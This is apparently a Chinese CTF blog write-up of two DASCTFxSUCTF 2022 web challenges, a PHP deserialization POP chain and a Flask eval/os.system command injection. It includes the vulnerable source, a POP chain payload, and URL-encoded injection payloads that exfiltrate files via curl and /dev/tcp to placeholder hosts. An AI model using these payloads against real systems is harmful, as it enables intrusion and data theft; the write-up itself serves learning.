@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='写在前面 DASCTF没有好好打，作业太多了一直在赶ddl。但是好像确实不是很难的样子，写不出来果然还是我太菜了&amp;hellip; 以及，希望以后'><title>DASCTFxSUCTF-web-writeup</title>
+
+<link rel='canonical' href='https://example.com/2022/dasctfxsuctf-web-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.9386c8bee911c8cc9f9c4df385b91100cfdaf1122a331583f740062d4eae78a6.css"><meta property='og:title' content='DASCTFxSUCTF-web-writeup'>
+<meta property='og:description' content='写在前面 DASCTF没有好好打，作业太多了一直在赶ddl。但是好像确实不是很难的样子，写不出来果然还是我太菜了&amp;hellip; 以及，希望以后'>
+<meta property='og:url' content='https://example.com/2022/dasctfxsuctf-web-writeup/'>
+<meta property='og:site_name' content='k0a1i'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='php' /><meta property='article:tag' content='python' /><meta property='article:published_time' content='2022-03-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-02-10T00:20:12&#43;08:00'/>
+<meta name="twitter:title" content="DASCTFxSUCTF-web-writeup">
+<meta name="twitter:description" content="写在前面 DASCTF没有好好打，作业太多了一直在赶ddl。但是好像确实不是很难的样子，写不出来果然还是我太菜了&amp;hellip; 以及，希望以后"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://example.com" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>返回</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu84895f112c8e6c0fe80c5eecd5e543f0_258028_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">k0a1i</a></h1>
+        <h2 class="site-description">流水不争先,争的是滔滔不绝</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页/Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于/About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接/Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档/Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索/Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #80aba9; color: #fff;">
+                CTF | 端茶送水web手
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2022/dasctfxsuctf-web-writeup/">DASCTFxSUCTF-web-writeup</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 30, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    2218字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="写在前面">写在前面</h3>
+<p>DASCTF没有好好打，作业太多了一直在赶ddl。但是好像确实不是很难的样子，写不出来果然还是我太菜了&hellip;</p>
+<p>以及，希望以后抽空多做做题叭(・∀・(・∀・(・∀・*)</p>
+<h3 id="ezpop">ezpop</h3>
+<p>先放源码</p>
+<pre><code class="language-php">&lt;?php
+
+class crow
+{
+    public $v1;
+    public $v2;
+
+    function eval() {
+        echo new $this-&gt;v1($this-&gt;v2);
+    }
+
+    public function __invoke()
+    {
+        $this-&gt;v1-&gt;world();
+    }
+}
+
+class fin
+{
+    public $f1;
+
+    public function __destruct()
+    {
+        echo $this-&gt;f1 . '114514';
+    }
+
+    public function run()
+    {
+        ($this-&gt;f1)();
+    }
+
+    public function __call($a, $b)
+    {
+        echo $this-&gt;f1-&gt;get_flag();
+    }
+
+}
+
+class what
+{
+    public $a;
+
+    public function __toString()
+    {
+        $this-&gt;a-&gt;run();
+        return 'hello';
+    }
+}
+class mix
+{
+    public $m1;
+
+    public function run()
+    {
+        ($this-&gt;m1)();
+    }
+
+    public function get_flag()
+    {
+        eval('#' . $this-&gt;m1);
+    }
+
+}
+
+if (isset($_POST['cmd'])) {
+    unserialize($_POST['cmd']);
+}
+else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>太久没有写php的反序列化了，魔术方法怎么触发都忘得差不多了，所以翻出了<a class="link" href="https://blog.csdn.net/solitudi/article/details/113588692"  target="_blank" rel="noopener"
+    >y4的总结</a>又跟着看了一遍（记性差真的好烦啊）</p>
+<pre><code class="language-php">    __invoke() 在对象被作为函数调用时触发
+    __destruct() 在对象被销毁时触发
+    __call() 在调用未知或者不可访问的函数时触发
+    __toString() 在对象被作为字符串使用时触发(比如打印啦、拼接啦..)
+</code></pre>
+<p>首先注意到mix类里面的get_flag函数里有一个eval，所以入口应该就是这里。于是可以反推出pop链应该怎么构造。</p>
+<p>get_flag里面有一个eval函数,明显我们需要利用这个点进行命令执行.为了摸到这个eval,需要m1可控,还要执行get_flag();在fin里面调用__call可以使f1调用get_flag(),为了调用__call，可以利用crow里的__invoke，使v1调用未知函数而触发__call;为了调用__invoke,又需要将某个对象作为函数触发，这里可以使用fin的run或者mix的run;为了调用run，需要进到__toString里，但是触发这个__toString()又需要将对象作为字符串调用，所以自然就进入__destruct调用里面的字符串拼接。分析完以上的问题，就可以构造pop链了。</p>
+<pre><code>流程主要是:
+fin::_destruct()
+what::__toString()
+fin::run()/mix::run()
+crow::__invoke()
+fin::__call()
+mix::get_flag()
+</code></pre>
+<p>所以定义如下的变量（也可以直接重新构造类）</p>
+<pre><code class="language-php">$mix = new mix();
+$mix-&gt;m1 = &quot;\nsystem('whoami');&quot;; // m1是需要拼接进eval的命令。
+$fin3 = new fin();
+$fin3-&gt;f1 = $mix;
+$crow = new crow();
+$crow-&gt;v1 = $fin3;
+//$mix2 = new mix(); 
+//$mix2-&gt;m1 = $crow;
+$fin2 = new fin(); // 这里的fin2换成上面的mix2同样可以实现，效果一样的
+$fin2-&gt;f1 = $crow;
+$what = new what();
+$what-&gt;a = $fin2;
+$fin = new fin();
+$fin-&gt;f1 = $what;
+
+echo serialize($fin);
+unserialize(serialize($fin));
+</code></pre>
+<p>这里有一个点是eval里面拼接了注释符号<code>#</code>，为了绕过这个注释，可以写入<code>\n</code>来绕过。不过有一点比较坑的是hackbar不能传进换行，好像burp也不行，所以最后采用python发包打的远程。以及在这里遇到了php单引号和双引号字符转义的问题，我一定是最后一个知道php的单引号内字符串只转义斜杠和单引号的叭55555</p>
+<p>对了，目录下面有很多的文件，其实只要执行<code>cat *</code>，或者cat `ls` 就可以了，但是当时没注意，还以为flag放在其他的目录下面，我翻遍了都没找到。谁知道就在当前目录下面TT ( zyx : 都到这里了，肯定不会为难你的啦~ : )好叭</p>
+<h3 id="calc">calc</h3>
+<p>这道题其实完全没看..是赛后照着wp补的题，所以记录一下两种解法。都非常好，值得学习。</p>
+<p>先贴上源码</p>
+<pre><code class="language-python">#coding=utf-8
+from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
+import random
+from urllib import parse
+import os
+from werkzeug.utils import secure_filename
+import time
+
+
+app=Flask(__name__)
+
+def waf(s):
+    blacklist = ['import','(',')',' ','_','|',';','&quot;','{','}','&amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
+    flag = True
+    for no in blacklist:
+        if no.lower() in s.lower():
+            flag= False
+            print(no)
+            break
+    return flag
+    
+
+@app.route(&quot;/&quot;)
+def index():
+    &quot;欢迎来到SUctf2022&quot;
+    return render_template(&quot;index.html&quot;)
+
+@app.route(&quot;/calc&quot;,methods=['GET'])
+def calc():
+    ip = request.remote_addr
+    num = request.values.get(&quot;num&quot;)
+    log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)
+    
+    if waf(num):
+        try:
+            data = eval(num)
+            os.system(log)
+        except:
+            pass
+        return str(data)
+    else:
+        return &quot;waf!!&quot;
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host='0.0.0.0',port=5000)  
+</code></pre>
+<p>这里主要的考点是如何绕过eval()与os.system命令执行。因为黑名单里ban了很多很多东西，剩下的几乎没有多少（这里有一个习惯向二师傅学习，在碰到大量的黑名单过滤的时候，考虑它没有过滤的东西，再去找解题思路），但是剩下的东西都很有用，比如说<code>'#','`','&gt;','$',&quot;'&quot;</code>。</p>
+<p>所以先看看第一种解法。</p>
+<h4 id="解法一">解法一</h4>
+<p><code>#</code>在python里是注释符，后面跟着的内容会被注释掉不解析。所以如果传入的num是</p>
+<pre><code>1#123
+</code></pre>
+<p>通过eval解析出来的内容就只是个1</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 160; 
+			flex-basis: 385px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220328200628532.png" data-size="236x147">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220328200628532.png"
+			width="236"
+			height="147"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220328200628532_huf6f7e5fd90b45b54a5d77a1a076f6a19_4221_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220328200628532_huf6f7e5fd90b45b54a5d77a1a076f6a19_4221_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220328200628532">
+	</a>
+	
+	<figcaption>image-20220328200628532</figcaption>
+	
+</figure></p>
+<p>这一点很神奇，原来python里面好多函数在解析字符串的时候会把注释符后面跟着的注释掉，查了很久资料也没有查到一个官方给的说法（好叭是我菜）</p>
+<p>但是如果是os.system，传到shell里面会把<code>#</code>看作字符而非注释符。所以尝试拼接这个<code>echo {0} {1} {2}&gt; ./tmp/log.txt</code>来让os.system执行。首先来看一下在bash里面的结果。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 647; 
+			flex-basis: 1554px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220328202428403.png" data-size="680x105">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220328202428403.png"
+			width="680"
+			height="105"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220328202428403_hu7c0f1c0f9b3e05da76e046dc971ee22a_11676_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220328202428403_hu7c0f1c0f9b3e05da76e046dc971ee22a_11676_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220328202428403">
+	</a>
+	
+	<figcaption>image-20220328202428403</figcaption>
+	
+</figure></p>
+<p>执行之后，打开log.txt，可以看到反引号里面的命令被执行并且将结果输入log.txt了</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 282; 
+			flex-basis: 679px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220328202502583.png" data-size="399x141">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220328202502583.png"
+			width="399"
+			height="141"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220328202502583_hu7e93c3657d040487e64cfc9542929a1e_7607_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220328202502583_hu7e93c3657d040487e64cfc9542929a1e_7607_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220328202502583">
+	</a>
+	
+	<figcaption>image-20220328202502583</figcaption>
+	
+</figure></p>
+<p>所以利用这一点，可以考虑传入一个可以让os.system执行的命令，尝试外带出结果。这里空格被过滤，可以考虑其他的空白符。</p>
+<p>可以先写入再外带。</p>
+<p>payload</p>
+<pre><code>num = 1%23`ls%09/`%23
+num = 1%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23
+</code></pre>
+<p>二师傅给的payload是直接外带。</p>
+<p>payload</p>
+<pre><code>num = 1%23%60%2Fbin%2Fbash%09-c%09%27cat%09.%2F*%3E%2Fdev%2Ftcp%2Fip%2Fport%27%60%3E
+</code></pre>
+<p>服务器这头监听一下就行。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 340; 
+			flex-basis: 818px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220329171534234.png" data-size="467x137">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220329171534234.png"
+			width="467"
+			height="137"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220329171534234_huc1e8c5937d28d3c7851b8bc325492717_10815_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220329171534234_huc1e8c5937d28d3c7851b8bc325492717_10815_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220329171534234">
+	</a>
+	
+	<figcaption>image-20220329171534234</figcaption>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 2000; 
+			flex-basis: 4800px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220329160322856.png" data-size="1160x58">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220329160322856.png"
+			width="1160"
+			height="58"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220329160322856_hu393e81e5b3888cba65c1da2c64406c60_79670_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220329160322856_hu393e81e5b3888cba65c1da2c64406c60_79670_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220329160322856">
+	</a>
+	
+	<figcaption>image-20220329160322856</figcaption>
+	
+</figure></p>
+<h4 id="解法二">解法二</h4>
+<p>利用python的三引号构造多行字符串，三引号括起来的内容在eval里被当作字符串，是不会报错的。比如说：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 246; 
+			flex-basis: 591px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220329173754460.png" data-size="271x110">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220329173754460.png"
+			width="271"
+			height="110"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220329173754460_hud597a1a14bd3b1e8e791d9af7b8aaae6_3470_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220329173754460_hud597a1a14bd3b1e8e791d9af7b8aaae6_3470_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220329173754460">
+	</a>
+	
+	<figcaption>image-20220329173754460</figcaption>
+	
+</figure></p>
+<p>既然过了eval，那接下来开始考虑怎么让shell执行。先来看看shell里面三引号的反应。首先shell是支持多行字符串的，第一第二个输出可以看出来。并且shell里面对多个单引号，一般是采取闭合的办法来识别，看第三个输出。再加上shell里面，以<code>#</code>开头的字符串会被当作注释，不予输出，看第四个例子。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 76; 
+			flex-basis: 183px"
+	>
+	<a href="/2022/dasctfxsuctf-web-writeup/image-20220329173926144.png" data-size="365x478">
+		<img src="/2022/dasctfxsuctf-web-writeup/image-20220329173926144.png"
+			width="365"
+			height="478"
+			srcset="/2022/dasctfxsuctf-web-writeup/image-20220329173926144_hu66dc89d046d126126599c1d277f16485_22935_480x0_resize_box_3.png 480w, /2022/dasctfxsuctf-web-writeup/image-20220329173926144_hu66dc89d046d126126599c1d277f16485_22935_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220329173926144">
+	</a>
+	
+	<figcaption>image-20220329173926144</figcaption>
+	
+</figure></p>
+<p>所以根据eval和shell对待三引号字符串的不同解释，可以构造如下输入：</p>
+<pre><code>'''1'\nls\n#'3'''
+</code></pre>
+<p>把这个输入拼接到echo里面就是</p>
+<pre><code>echo {0} {1} '''1'
+ls
+#'3'''&gt; ./tmp/log.txt
+</code></pre>
+<p>成功命令执行。</p>
+<p>这里为了拿到flag，可以直接外带</p>
+<p>payload</p>
+<pre><code>num = %27%27%271%27%0Acat%0A/*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27%27%27
+</code></pre>
+<h3 id="参考资料">参考资料</h3>
+<p><a class="link" href="https://ek1ng.com/2022/03/26/DASCTF/"  target="_blank" rel="noopener"
+    >DASCTF X SU 2022 writeup</a></p>
+<p><a class="link" href="https://blog.csdn.net/qq_42880719/article/details/123763744"  target="_blank" rel="noopener"
+    >2022DASCTF X SU 三月春季挑战赛 WriteUp</a></p>
+<p><a class="link" href="https://blog.csdn.net/solitudi/article/details/113588692"  target="_blank" rel="noopener"
+    >[CTF]PHP反序列化总结</a></p>
+<h3 id="写在后面">写在后面</h3>
+<p>又水了一场比赛，不过还是学到东西了。以前没能把相应的知识点记录下来真的有一点可惜（很大一部分原因是笔记丢了23333），不过大部分的事情什么时候开始都不算晚吧（大概）。</p>
+<p>加油加油。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">web</a>
+        
+            <a href="/tags/php/">php</a>
+        
+            <a href="/tags/python/">python</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Feb 10, 2023 00:20 CST
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">蓝帽杯2022</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">从一道题学ReDos及SQL盲注</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/vnctf2022-easyjava/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">VNctf2022-easyJava</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    
+
+    <footer class="site-footer">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  <script>
+    (function (u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+        s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function () {
+      pangu.spacingPage();
+    });
+  </script>
+
+  <section class="copyright">
+    &copy;
+    
+    2020 -
+    
+    2023 <a href="">k0a1i</a>·<i class="fas fa-bell"></i>
+    <a id="days">0</a>Days<br>
+    共叨叨了9502字的废话</br><span>
+      
+      <p>
+  </section>
+
+  <section class="powerby">
+    Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+    Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener"
+        data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+    
+  </section>
+
+  <script>
+    var s1 = '2023-02-09';
+    s1 = new Date(s1.replace(/-/g, "/"));
+    s2 = new Date();
+    var days = s2.getTime() - s1.getTime();
+    var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+    document.getElementById('days').innerHTML = number_of_days;
+  </script>
+
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>搜索</label>
+            <input name="keyword" required placeholder="输入关键词..." />
+        
+            <button title="搜索">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+    <section class="widget archives">
